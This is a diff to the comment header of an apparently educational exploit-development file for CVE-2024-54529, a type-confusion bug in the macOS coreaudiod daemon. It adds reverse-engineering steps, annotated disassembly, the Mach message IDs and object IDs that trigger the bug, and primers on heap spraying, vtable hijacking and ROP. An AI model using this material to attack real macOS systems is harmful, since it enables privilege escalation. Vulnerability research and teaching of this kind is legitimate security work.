@@ -295,8 +295,18 @@
  *
  * Process details (from `ps aux | grep coreaudiod`):
  *
- *   USER          PID  COMMAND
- *   _coreaudiod   xxx  /usr/sbin/coreaudiod
+ *   ACTUAL OUTPUT (macOS Sequoia 15.x):
+ *   ────────────────────────────────────────────────────────────────────────
+ *   USER          PID   %CPU  %MEM    COMMAND
+ *   _coreaudiod   188   6.0   0.1     /usr/sbin/coreaudiod
+ *   _coreaudiod   301   0.0   0.0     .../AppleDeviceQueryService.xpc
+ *   _coreaudiod   286   0.0   0.0     .../com.apple.audio.SandboxHelper.xpc
+ *   _coreaudiod   266   0.0   0.0     /usr/sbin/distnoted agent
+ *   _coreaudiod   262   0.0   0.0     Core Audio Driver (ParrotAudioPlugin.driver)
+ *   ────────────────────────────────────────────────────────────────────────
+ *
+ *   NOTE: The main coreaudiod process (PID 188 in this example) spawns
+ *   several child XPC services. The exploit targets the main daemon.
  *
  * The _coreaudiod user is a special system account with limited but still
  * significant privileges - enough to read/write files, make network
@@ -475,6 +485,14 @@
  *   File: cve-2024-54529-poc-macos-sequoia-15.0.1.c (this repository)
  *   Location: /Users/tal/wudan/dojo/CoreAudioFuzz/cve-2024-54529-poc-macos-sequoia-15.0.1.c
  *
+ *   KEY LINES IN THE POC:
+ *   ─────────────────────
+ *   Line 67:  service_name = "com.apple.audio.audiohald"
+ *   Line 79:  bootstrap_look_up() to get service port
+ *   Line 102: msgh_id = 1010000 (XSystem_Open - client init)
+ *   Line 140: msgh_id = 1010059 (XIOContext_Fetch_Workgroup_Port - VULNERABLE)
+ *   Line 143: object_id = 0x1 (wrong object type triggers confusion)
+ *
  *   Compile:
  *     $ clang -framework Foundation cve-2024-54529-poc-macos-sequoia-15.0.1.c -o poc
  *
@@ -508,26 +526,160 @@
  *
  *   STEP 4: Disassemble the vulnerable function
  *   ────────────────────────────────────────────
- *   Tool: Hopper Disassembler, IDA Pro, or Ghidra
- *   Binary: /System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio
  *
- *   Search for: _XIOContext_Fetch_Workgroup_Port
+ *   PREREQUISITE: Install reverse engineering tools
+ *   ─────────────────────────────────────────────────
+ *   $ brew install radare2                    # RE framework with disassembler
+ *   $ brew install blacktop/tap/ipsw          # Tool for dyld cache extraction
+ *   $ brew install rizin                      # Modern radare2 fork (optional)
  *
- *   Key instruction pattern:
- *     mov rax, qword ptr [rdi+0x68]   ; Read object field at offset 0x68
- *     mov rax, qword ptr [rax+0x168] ; Dereference as vtable
- *     call rax                        ; Call function pointer
+ *   STEP 4a: Extract CoreAudio from the dyld shared cache
+ *   ───────────────────────────────────────────────────────
+ *   On modern macOS (11+), system libraries live in the dyld shared cache,
+ *   not as separate files. We need to extract CoreAudio first.
  *
- *   STEP 5: Compare object layouts
- *   ───────────────────────────────
- *   Use lldb to examine object memory:
- *     (lldb) attach -p <coreaudiod_pid>
- *     (lldb) expr (char*)object_type_at_offset_0x18
+ *   $ mkdir ~/extracted_libs
+ *   $ ipsw dyld extract \
+ *       /System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e \
+ *       "/System/Library/Frameworks/CoreAudio.framework/Versions/A/CoreAudio" \
+ *       --output ~/extracted_libs --force
  *
- *   IOContext objects: type = "ioct" at offset 0x18
- *   Engine objects: type = "ngne" at offset 0x18
+ *   EXPECTED OUTPUT:
+ *   Created ~/extracted_libs/CoreAudio (approximately 60 MB)
  *
- *   The handler expects "ioct" but receives "ngne" → TYPE CONFUSION
+ *   STEP 4b: Find the vulnerable function symbol
+ *   ──────────────────────────────────────────────
+ *   $ nm ~/extracted_libs/CoreAudio | grep -i "XIOContext_Fetch_Workgroup"
+ *
+ *   OUTPUT:
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   0000000183c11ce0 t __XIOContext_Fetch_Workgroup_Port
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   The 't' means local text (code) symbol. Address: 0x183c11ce0
+ *
+ *   STEP 4c: Disassemble the vulnerable function with radare2
+ *   ────────────────────────────────────────────────────────────
+ *   $ r2 -q -e scr.color=0 \
+ *       -c "aaa; s sym.__XIOContext_Fetch_Workgroup_Port; pdf" \
+ *       ~/extracted_libs/CoreAudio | head -80
+ *
+ *   ACTUAL DISASSEMBLY OUTPUT (arm64e, macOS Sequoia 15.x):
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   ┌ 988: sym.__XIOContext_Fetch_Workgroup_Port (arg1, arg2);
+ *   │  0x183c11ce0    7f2303d5   pacibsp              ; PAC signature
+ *   │  0x183c11ce4    ff8302d1   sub sp, sp, 0xa0     ; Stack frame
+ *   │  ...
+ *   │  ; ═══ MESSAGE PARSING ═══
+ *   │  0x183c11d98    152040b9   ldr w21, [x0, 0x20]  ; Load object_id from msg
+ *   │
+ *   │  ; ═══ OBJECT LOOKUP - NO TYPE CHECK! ═══
+ *   │  0x183c11de0    a490fe97   bl CopyObjectByObjectID  ; Fetch object
+ *   │  0x183c11de4    f70300aa   mov x23, x0          ; x23 = object pointer
+ *   │  0x183c11de8    e01000b4   cbz x0, error_path   ; Only NULL check!
+ *   │
+ *   │  ; ═══ TYPE STRING LOADING (too late!) ═══
+ *   │  0x183c11dec    8a6e8c52   mov w10, 0x6374      ; 'tc' (part of 'ioct')
+ *   │  0x183c11df0    ea2dad72   movk w10, 0x696f, lsl 16  ; = 0x696f6374 'ioct'
+ *   │  0x183c11df4    e9a24329   ldp w9, w8, [x23, 0x1c] ; Load object type
+ *   │
+ *   │  ; ═══ VULNERABLE DEREFERENCE (BEFORE type validation!) ═══
+ *   │  0x183c11e24    e03a40f9   ldr x0, [x23, 0x70]  ; *** THE BUG ***
+ *   │                                                  ; Reads offset 0x70
+ *   │                                                  ; Expects IOContext ptr
+ *   │                                                  ; But could be Engine!
+ *   │  0x183c11e28    100040f9   ldr x16, [x0]        ; Dereference that ptr
+ *   │  0x183c11e34    301ac1da   autda x16, x17       ; PAC verify
+ *   │  0x183c11e40    080240f9   ldr x8, [x16]        ; Load func pointer
+ *   │  ...                                             ; Call through x8
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   THE BUG EXPLAINED:
+ *   At address 0x183c11e24, the code reads [x23 + 0x70] assuming x23 points
+ *   to an IOContext object where offset 0x70 contains a workgroup pointer.
+ *   However, CopyObjectByObjectID() returns ANY object type without validation!
+ *   If x23 points to an Engine object, offset 0x70 contains unrelated data.
+ *
+ *   STEP 4d: Examine CopyObjectByObjectID (confirms no type check)
+ *   ─────────────────────────────────────────────────────────────────
+ *   $ r2 -q -e scr.color=0 \
+ *       -c "aaa; pdf @ method.HALS_ObjectMap.CopyObjectByObjectID*" \
+ *       ~/extracted_libs/CoreAudio | head -40
+ *
+ *   KEY LINES:
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   0x183bb60d4  ldr w10, [x8, 0x10]   ; Load object_id from list entry
+ *   0x183bb60d8  cmp w10, w19          ; Compare with requested ID
+ *   0x183bb60dc  b.eq found            ; Match? Return the object
+ *   ; Returns object pointer - NO TYPE VALIDATION WHATSOEVER!
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   STEP 5: Compare object memory layouts
+ *   ──────────────────────────────────────
+ *
+ *   STEP 5a: Get coreaudiod PID and attach debugger
+ *   ──────────────────────────────────────────────────
+ *   Terminal 1:
+ *     $ pgrep coreaudiod
+ *     188   # Example PID - yours will differ
+ *
+ *     $ sudo lldb -n coreaudiod
+ *     (lldb) c   # Continue execution
+ *
+ *   STEP 5b: Set breakpoint on CopyObjectByObjectID return
+ *   ─────────────────────────────────────────────────────────
+ *   (lldb) image lookup -rn CopyObjectByObjectID
+ *   (lldb) breakpoint set -n "HALS_ObjectMap::CopyObjectByObjectID"
+ *   (lldb) c
+ *
+ *   Terminal 2 (trigger the vulnerability):
+ *     $ ./poc   # Or the full exploit
+ *
+ *   STEP 5c: When breakpoint hits, examine the object
+ *   ────────────────────────────────────────────────────
+ *   (lldb) finish      # Let CopyObjectByObjectID complete
+ *   (lldb) register read x0
+ *
+ *   EXAMPLE OUTPUT:
+ *        x0 = 0x0000000143a08c00   # Pointer to the returned object
+ *
+ *   STEP 5d: Dump object memory to see the layout
+ *   ────────────────────────────────────────────────
+ *   (lldb) memory read 0x143a08c00 -c 0x80 -f x
+ *
+ *   IOContext object (type 'ioct') - EXPECTED:
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   0x143a08c00: 0x0183b2d000  ; Offset 0x00: vtable pointer
+ *   0x143a08c08: 0x00000001    ; Offset 0x08: reference count
+ *   0x143a08c10: 0x0000002c    ; Offset 0x10: object_id = 44
+ *   0x143a08c18: 0x74636f69    ; Offset 0x18: type = 'ioct' (little-endian)
+ *   ...
+ *   0x143a08c70: 0x0143a45000  ; Offset 0x70: VALID workgroup pointer
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   Engine object (type 'ngne') - PROVIDED BY ATTACKER:
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   0x143b12400: 0x0183c2e000  ; Offset 0x00: different vtable
+ *   0x143b12408: 0x00000001    ; Offset 0x08: reference count
+ *   0x143b12410: 0x00002e1f    ; Offset 0x10: object_id = 11807
+ *   0x143b12418: 0x656e676e    ; Offset 0x18: type = 'ngne' ("engn" reversed)
+ *   ...
+ *   0x143b12470: 0x4141414141  ; Offset 0x70: GARBAGE (not a workgroup!)
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   STEP 5e: Verify the type string directly
+ *   ──────────────────────────────────────────
+ *   (lldb) memory read -f s -c 4 0x143a08c18
+ *   "ioct"   # IOContext - what handler expects
+ *
+ *   (lldb) memory read -f s -c 4 0x143b12418
+ *   "ngne"   # Engine (reversed: "engn") - what attacker provides
+ *
+ *   TYPE CONFUSION RESULT:
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   Handler expects 'ioct' where offset 0x70 = valid workgroup pointer
+ *   Attacker provides 'ngne' where offset 0x70 = unrelated data/garbage
+ *   Handler dereferences garbage → controlled crash or code execution!
+ *   ─────────────────────────────────────────────────────────────────────────
  *
  * ═══════════════════════════════════════════════════════════════════════════
  *
@@ -573,6 +725,654 @@
  *
  * =============================================================================
  * END OF PART 0: VULNERABILITY RESEARCH FOUNDATIONS
+ * =============================================================================
+ *
+ * =============================================================================
+ * =============================================================================
+ * PART 0.5: FIRST PRINCIPLES - HOW COMPUTERS REALLY WORK
+ * =============================================================================
+ * =============================================================================
+ *
+ * Before diving into exploitation, we need to understand the machine at its
+ * most fundamental level. This section builds knowledge from the ground up,
+ * suitable for beginners while providing depth for experienced practitioners.
+ *
+ * "If you wish to make an apple pie from scratch, you must first invent
+ *  the universe." - Carl Sagan
+ *
+ * Similarly, to truly understand exploitation, we must first understand:
+ *   - How CPUs execute instructions
+ *   - How memory is organized
+ *   - How programs are structured
+ *   - How control flow works
+ *
+ * -----------------------------------------------------------------------------
+ * 0.8 THE CPU: A FIRST PRINCIPLES VIEW
+ * -----------------------------------------------------------------------------
+ *
+ * At its core, a CPU is an incredibly fast calculator that:
+ *   1. FETCHES an instruction from memory
+ *   2. DECODES what the instruction means
+ *   3. EXECUTES the instruction
+ *   4. STORES the result
+ *   5. REPEATS (billions of times per second)
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                    CPU EXECUTION CYCLE                              │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │    ┌──────────┐                                                     │
+ *   │    │  MEMORY  │                                                     │
+ *   │    │  ┌─────┐ │                                                     │
+ *   │    │  │inst1│◀──┐   FETCH: Read instruction from address in RIP    │
+ *   │    │  ├─────┤   │                                                   │
+ *   │    │  │inst2│   │                                                   │
+ *   │    │  ├─────┤   │                                                   │
+ *   │    │  │inst3│   │                                                   │
+ *   │    │  └─────┘   │                                                   │
+ *   │    └────────────┼───────────────────────────────────────────────┐   │
+ *   │                 │                                               │   │
+ *   │                 │         ┌─────────────────────────────────────┴─┐ │
+ *   │                 │         │              CPU                      │ │
+ *   │                 │         │  ┌───────────────────────────────┐   │ │
+ *   │                 └─────────┤  │  RIP (Instruction Pointer)    │   │ │
+ *   │                           │  │  Points to NEXT instruction   │   │ │
+ *   │                           │  └───────────────────────────────┘   │ │
+ *   │                           │                                       │ │
+ *   │                           │  ┌───────────────────────────────┐   │ │
+ *   │                           │  │  REGISTERS (fast storage)     │   │ │
+ *   │                           │  │  RAX, RBX, RCX, RDX, RSI,     │   │ │
+ *   │                           │  │  RDI, RSP, RBP, R8-R15        │   │ │
+ *   │                           │  └───────────────────────────────┘   │ │
+ *   │                           │                                       │ │
+ *   │                           │  ┌───────────────────────────────┐   │ │
+ *   │                           │  │  ALU (Arithmetic Logic Unit)  │   │ │
+ *   │                           │  │  Does actual computation      │   │ │
+ *   │                           │  └───────────────────────────────┘   │ │
+ *   │                           └───────────────────────────────────────┘ │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * KEY REGISTERS (x86-64 architecture, used in this exploit):
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                    x86-64 REGISTER SET                              │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   GENERAL PURPOSE REGISTERS (64-bit):                               │
+ *   │   ┌──────┬──────────────────────────────────────────────────────┐  │
+ *   │   │ RAX  │ Accumulator, return values, syscall number           │  │
+ *   │   │ RBX  │ Base register, preserved across calls                │  │
+ *   │   │ RCX  │ Counter, 4th argument (Windows ABI)                  │  │
+ *   │   │ RDX  │ Data, 3rd syscall argument                           │  │
+ *   │   │ RSI  │ Source index, 2nd syscall argument                   │  │
+ *   │   │ RDI  │ Destination index, 1st syscall argument              │  │
+ *   │   │ RSP  │ Stack Pointer - TOP of current stack                 │  │
+ *   │   │ RBP  │ Base Pointer - BOTTOM of current stack frame         │  │
+ *   │   │ R8   │ 5th syscall argument                                 │  │
+ *   │   │ R9   │ 6th syscall argument                                 │  │
+ *   │   │R10-15│ Additional general purpose                           │  │
+ *   │   └──────┴──────────────────────────────────────────────────────┘  │
+ *   │                                                                     │
+ *   │   SPECIAL REGISTERS:                                                │
+ *   │   ┌──────┬──────────────────────────────────────────────────────┐  │
+ *   │   │ RIP  │ Instruction Pointer - address of NEXT instruction    │  │
+ *   │   │      │ THIS IS THE TARGET FOR EXPLOITATION!                 │  │
+ *   │   │ FLAGS│ Status flags (zero, carry, overflow, etc.)           │  │
+ *   │   └──────┴──────────────────────────────────────────────────────┘  │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * WHY RIP MATTERS:
+ *
+ *   RIP (Instruction Pointer) determines WHAT CODE RUNS NEXT.
+ *
+ *   Normal execution:
+ *     RIP points to instruction → instruction executes → RIP advances
+ *
+ *   Exploitation goal:
+ *     CORRUPT RIP → RIP points to ATTACKER'S CODE → attacker wins
+ *
+ *   This is the essence of control-flow hijacking!
+ *
+ * THE STACK POINTER (RSP):
+ *
+ *   RSP points to the "top" of the stack (actually the LOWEST address
+ *   because stacks grow DOWNWARD on x86).
+ *
+ *   Critical operations:
+ *     PUSH RAX  → RSP -= 8; [RSP] = RAX   (store value, move stack down)
+ *     POP RAX   → RAX = [RSP]; RSP += 8   (load value, move stack up)
+ *     CALL addr → PUSH RIP; RIP = addr    (save return, jump to function)
+ *     RET       → POP RIP                 (return to saved address)
+ *
+ *   The RET instruction is key for ROP: it loads RIP from the stack!
+ *
+ * ARM64 REGISTERS (Apple Silicon):
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                    arm64 REGISTER SET                               │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   GENERAL PURPOSE (31 registers, 64-bit):                           │
+ *   │   ┌──────┬──────────────────────────────────────────────────────┐  │
+ *   │   │ X0   │ 1st argument, return value                           │  │
+ *   │   │ X1-X7│ Arguments 2-8                                        │  │
+ *   │   │ X8   │ Indirect result location (syscall number on Linux)   │  │
+ *   │   │X9-X15│ Temporary/scratch registers                          │  │
+ *   │   │X16-17│ Intra-procedure call scratch (IP0, IP1)              │  │
+ *   │   │ X18  │ Platform-specific (TLS on some systems)              │  │
+ *   │   │X19-28│ Callee-saved registers                               │  │
+ *   │   │ X29  │ Frame Pointer (FP) - like RBP                        │  │
+ *   │   │ X30  │ Link Register (LR) - return address                  │  │
+ *   │   │ SP   │ Stack Pointer - like RSP                             │  │
+ *   │   └──────┴──────────────────────────────────────────────────────┘  │
+ *   │                                                                     │
+ *   │   SPECIAL:                                                          │
+ *   │   ┌──────┬──────────────────────────────────────────────────────┐  │
+ *   │   │ PC   │ Program Counter (like RIP)                           │  │
+ *   │   │ NZCV │ Condition flags (Negative, Zero, Carry, oVerflow)    │  │
+ *   │   └──────┴──────────────────────────────────────────────────────┘  │
+ *   │                                                                     │
+ *   │   ARM64e (Apple) adds Pointer Authentication Codes (PAC):          │
+ *   │   - Pointers are signed with cryptographic codes                   │
+ *   │   - Makes ROP significantly harder (but not impossible)            │
+ *   │   - PACIB/AUTIB instructions sign/verify code pointers             │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * INSTRUCTION EXAMPLES (x86-64):
+ *
+ *   mov rax, 0x42      ; RAX = 0x42 (load immediate value)
+ *   mov rax, [rdi]     ; RAX = memory at address RDI (load from memory)
+ *   mov [rdi], rax     ; memory at RDI = RAX (store to memory)
+ *   add rax, rbx       ; RAX = RAX + RBX
+ *   sub rsp, 0x20      ; RSP = RSP - 0x20 (allocate 32 bytes on stack)
+ *   call 0x12345       ; Push RIP, jump to 0x12345
+ *   ret                ; Pop RIP (return)
+ *   jmp 0x12345        ; Jump to address (no push)
+ *   cmp rax, rbx       ; Compare (set flags)
+ *   jz 0x12345         ; Jump if zero flag set
+ *   syscall            ; Invoke kernel (RIP doesn't change normally)
+ *
+ * INSTRUCTION EXAMPLES (arm64):
+ *
+ *   mov x0, #0x42      ; X0 = 0x42
+ *   ldr x0, [x1]       ; X0 = memory at address X1 (LOAD)
+ *   str x0, [x1]       ; memory at X1 = X0 (STORE)
+ *   add x0, x0, x1     ; X0 = X0 + X1
+ *   sub sp, sp, #0x20  ; Allocate 32 bytes on stack
+ *   bl 0x12345         ; Branch with Link (like call) - saves to X30
+ *   ret                ; Return (jump to X30)
+ *   b 0x12345          ; Branch (like jmp)
+ *   cmp x0, x1         ; Compare
+ *   b.eq 0x12345       ; Branch if equal
+ *   svc #0             ; Supervisor call (syscall)
+ *
+ * -----------------------------------------------------------------------------
+ * 0.9 MEMORY LAYOUT: WHERE PROGRAMS LIVE
+ * -----------------------------------------------------------------------------
+ *
+ * A running program's memory is divided into distinct regions:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │              PROCESS VIRTUAL ADDRESS SPACE                          │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   0xFFFFFFFFFFFFFFFF  ┌─────────────────────────────────────────┐  │
+ *   │   (High addresses)    │          KERNEL SPACE                   │  │
+ *   │                       │    (inaccessible from user mode)        │  │
+ *   │   ─────────────────── ├─────────────────────────────────────────┤  │
+ *   │                       │                                         │  │
+ *   │                       │            STACK                        │  │
+ *   │                       │    (grows DOWNWARD ↓)                   │  │
+ *   │                       │    - Local variables                    │  │
+ *   │                       │    - Function arguments                 │  │
+ *   │                       │    - Return addresses ◀═══ TARGET!      │  │
+ *   │                       │    - Saved registers                    │  │
+ *   │              RSP ───▶ │    [current stack top]                  │  │
+ *   │                       │                                         │  │
+ *   │                       │         ↓ ↓ ↓ ↓ ↓ ↓                     │  │
+ *   │                       │                                         │  │
+ *   │                       │    (unmapped, grows on demand)          │  │
+ *   │                       │                                         │  │
+ *   │                       │         ↑ ↑ ↑ ↑ ↑ ↑                     │  │
+ *   │                       │                                         │  │
+ *   │                       │            HEAP                         │  │
+ *   │                       │    (grows UPWARD ↑)                     │  │
+ *   │                       │    - malloc() allocations               │  │
+ *   │                       │    - Dynamic objects ◀════ EXPLOIT!     │  │
+ *   │                       │    - CFString data (our ROP payload)    │  │
+ *   │                       │                                         │  │
+ *   │   ─────────────────── ├─────────────────────────────────────────┤  │
+ *   │                       │       BSS (Uninitialized Data)          │  │
+ *   │                       │    - Global variables (zeroed)          │  │
+ *   │   ─────────────────── ├─────────────────────────────────────────┤  │
+ *   │                       │       DATA (Initialized Data)           │  │
+ *   │                       │    - Global variables with values       │  │
+ *   │                       │    - String literals                    │  │
+ *   │   ─────────────────── ├─────────────────────────────────────────┤  │
+ *   │                       │           TEXT (Code)                   │  │
+ *   │                       │    - Executable instructions            │  │
+ *   │                       │    - Read-only (typically)              │  │
+ *   │                       │    - ROP gadgets live here              │  │
+ *   │   ─────────────────── ├─────────────────────────────────────────┤  │
+ *   │                       │      SHARED LIBRARIES (dyld)            │  │
+ *   │                       │    - libsystem_c.dylib                  │  │
+ *   │                       │    - CoreFoundation                     │  │
+ *   │                       │    - More gadgets here!                 │  │
+ *   │   0x0000000000000000  └─────────────────────────────────────────┘  │
+ *   │   (Low addresses)     (NULL page, unmapped for null deref catch)   │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * THE STACK IN DETAIL:
+ *
+ *   When a function is called, a "stack frame" is created:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     STACK FRAME ANATOMY                             │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   Before call to func():        After entering func():              │
+ *   │                                                                     │
+ *   │   HIGH ADDRESSES                HIGH ADDRESSES                      │
+ *   │   │                             │                                   │
+ *   │   │ ┌─────────────┐             │ ┌─────────────┐                   │
+ *   │   │ │ caller's    │             │ │ caller's    │                   │
+ *   │   │ │ local vars  │             │ │ local vars  │                   │
+ *   │   │ ├─────────────┤             │ ├─────────────┤                   │
+ *   │   │ │ arg3        │             │ │ arg3        │                   │
+ *   │   │ ├─────────────┤             │ ├─────────────┤                   │
+ *   │   │ │ arg2        │             │ │ arg2        │                   │
+ *   │   │ ├─────────────┤             │ ├─────────────┤                   │
+ *   │   │ │ arg1        │             │ │ arg1        │                   │
+ *   │ RSP▶├─────────────┤             │ ├─────────────┤                   │
+ *   │   │               │             │ │ RETURN ADDR │ ◀═══ CALL pushed  │
+ *   │   │               │             │ ├─────────────┤      this!        │
+ *   │   │               │             │ │ saved RBP   │ ◀═══ push rbp     │
+ *   │   ▼               │         RBP▶├─────────────┤                     │
+ *   │   LOW             │             │ │ local var1  │                   │
+ *   │                                 │ ├─────────────┤                   │
+ *   │                                 │ │ local var2  │                   │
+ *   │                             RSP▶├─────────────┤                     │
+ *   │                                 │               │                   │
+ *   │                                 ▼               │                   │
+ *   │                                 LOW                                 │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ *   Function prologue (common pattern):
+ *     push rbp          ; Save caller's base pointer
+ *     mov rbp, rsp      ; Set up new base pointer
+ *     sub rsp, 0x40     ; Allocate 64 bytes for local variables
+ *
+ *   Function epilogue:
+ *     leave             ; mov rsp, rbp; pop rbp
+ *     ret               ; Pop return address into RIP ◀═══ EXPLOIT TARGET!
+ *
+ * THE HEAP IN DETAIL:
+ *
+ *   The heap is managed by a memory allocator (malloc/free).
+ *   Understanding the allocator is crucial for exploitation.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     HEAP ALLOCATOR BASICS                           │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   When you call malloc(100):                                        │
+ *   │                                                                     │
+ *   │   1. Allocator finds a free block >= 100 bytes                      │
+ *   │   2. May split a larger block if needed                             │
+ *   │   3. Returns pointer to usable memory                               │
+ *   │   4. Allocator maintains metadata (size, free/used, etc.)           │
+ *   │                                                                     │
+ *   │   ┌────────────────────────────────────────────────────────────┐   │
+ *   │   │                      HEAP MEMORY                           │   │
+ *   │   ├────────────────────────────────────────────────────────────┤   │
+ *   │   │                                                            │   │
+ *   │   │   ┌────────┬────────────────────────────────────────────┐ │   │
+ *   │   │   │METADATA│          ALLOCATION 1                      │ │   │
+ *   │   │   │ (size) │  ptr ───▶ [user data starts here]          │ │   │
+ *   │   │   └────────┴────────────────────────────────────────────┘ │   │
+ *   │   │                                                            │   │
+ *   │   │   ┌────────┬────────────────────────────────────────────┐ │   │
+ *   │   │   │METADATA│          ALLOCATION 2 (freed)              │ │   │
+ *   │   │   │(free)  │  [available for reuse]                     │ │   │
+ *   │   │   └────────┴────────────────────────────────────────────┘ │   │
+ *   │   │                                                            │   │
+ *   │   │   ┌────────┬────────────────────────────────────────────┐ │   │
+ *   │   │   │METADATA│          ALLOCATION 3                      │ │   │
+ *   │   │   │ (size) │  [user data]                               │ │   │
+ *   │   │   └────────┴────────────────────────────────────────────┘ │   │
+ *   │   │                                                            │   │
+ *   │   └────────────────────────────────────────────────────────────┘   │
+ *   │                                                                     │
+ *   │   KEY INSIGHT: When you free() and then malloc() the same size,    │
+ *   │   you often get the SAME memory back! This is heap reuse.          │
+ *   │                                                                     │
+ *   │   EXPLOITATION CONSEQUENCE:                                         │
+ *   │   1. Attacker sprays heap with controlled data                     │
+ *   │   2. Attacker frees specific allocations (creates "holes")         │
+ *   │   3. Victim object allocates → lands in attacker's hole            │
+ *   │   4. Attacker's data is now treated as a valid object              │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * macOS SPECIFIC: Zone Allocators
+ *
+ *   macOS uses "zones" to group similar-sized allocations:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                    macOS MALLOC ZONES                               │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   TINY zone:   Allocations 1-1008 bytes                            │
+ *   │                Uses "magazine" allocator for performance           │
+ *   │                                                                     │
+ *   │   SMALL zone:  Allocations 1009-128KB                              │
+ *   │                Uses "magazine" allocator                           │
+ *   │                                                                     │
+ *   │   LARGE zone:  Allocations > 128KB                                 │
+ *   │                Uses vm_allocate directly                           │
+ *   │                                                                     │
+ *   │   Why this matters:                                                 │
+ *   │   - Objects of similar size land near each other                   │
+ *   │   - Helps heap grooming (predictable placement)                    │
+ *   │   - Zone boundaries can complicate exploitation                    │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * -----------------------------------------------------------------------------
+ * 0.10 CONTROL FLOW: HOW PROGRAMS MAKE DECISIONS
+ * -----------------------------------------------------------------------------
+ *
+ * Control flow is HOW the CPU decides which instruction to execute next.
+ *
+ *   SEQUENTIAL:     One instruction after another (RIP++)
+ *   CONDITIONAL:    Branch based on comparison (if/else)
+ *   FUNCTION CALL:  Jump to function, return when done
+ *   INDIRECT:       Jump/call through a pointer (vtable calls)
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                 CONTROL FLOW TYPES                                  │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   DIRECT CALL (hardcoded address):                                  │
+ *   │   ─────────────────────────────────                                 │
+ *   │       call 0x7fff12345678     ; Address known at compile time       │
+ *   │                                                                     │
+ *   │   INDIRECT CALL (through pointer):                                  │
+ *   │   ─────────────────────────────────                                 │
+ *   │       call [rax]              ; Address loaded from memory          │
+ *   │       call [rax + 0x18]       ; Vtable dispatch                     │
+ *   │                                                                     │
+ *   │   WHY INDIRECT CALLS ARE DANGEROUS:                                 │
+ *   │   ─────────────────────────────────                                 │
+ *   │       mov rax, [object_ptr]   ; Load vtable pointer                 │
+ *   │       call [rax + 0x18]       ; Call method at offset 0x18          │
+ *   │                                                                     │
+ *   │       If attacker controls object_ptr content:                      │
+ *   │       → They control what [rax + 0x18] points to                    │
+ *   │       → They control RIP after the call!                            │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * VTABLE EXPLOITATION (C++ objects):
+ *
+ *   C++ objects with virtual functions have a vtable pointer:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     VTABLE STRUCTURE                                │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   Object in memory:                  Vtable (read-only):            │
+ *   │   ┌─────────────────┐               ┌─────────────────────────┐    │
+ *   │   │ vtable_ptr  ────────────────────▶│ virtual_func_1 address │    │
+ *   │   ├─────────────────┤               ├─────────────────────────┤    │
+ *   │   │ member_var_1    │               │ virtual_func_2 address │    │
+ *   │   ├─────────────────┤               ├─────────────────────────┤    │
+ *   │   │ member_var_2    │               │ virtual_func_3 address │    │
+ *   │   ├─────────────────┤               └─────────────────────────┘    │
+ *   │   │ ...             │                                              │
+ *   │   └─────────────────┘                                              │
+ *   │                                                                     │
+ *   │   Calling obj->virtual_method() compiles to:                        │
+ *   │       mov rax, [obj]              ; Load vtable pointer             │
+ *   │       mov rcx, [rax + offset]     ; Load function pointer           │
+ *   │       call rcx                    ; Call the function               │
+ *   │                                                                     │
+ *   │   TYPE CONFUSION ATTACK:                                            │
+ *   │   1. Handler expects ObjectA with vtable at offset 0x00             │
+ *   │   2. Attacker provides ObjectB where offset 0x00 is different       │
+ *   │   3. Handler loads "vtable" from wrong location                     │
+ *   │   4. Handler calls through attacker-controlled pointer!             │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * This is EXACTLY what CVE-2024-54529 exploits!
+ *
+ * -----------------------------------------------------------------------------
+ * 0.11 ROP: RETURN-ORIENTED PROGRAMMING FUNDAMENTALS
+ * -----------------------------------------------------------------------------
+ *
+ * When you control the stack but can't inject code (due to W^X/NX/DEP),
+ * you chain together existing code snippets called "gadgets".
+ *
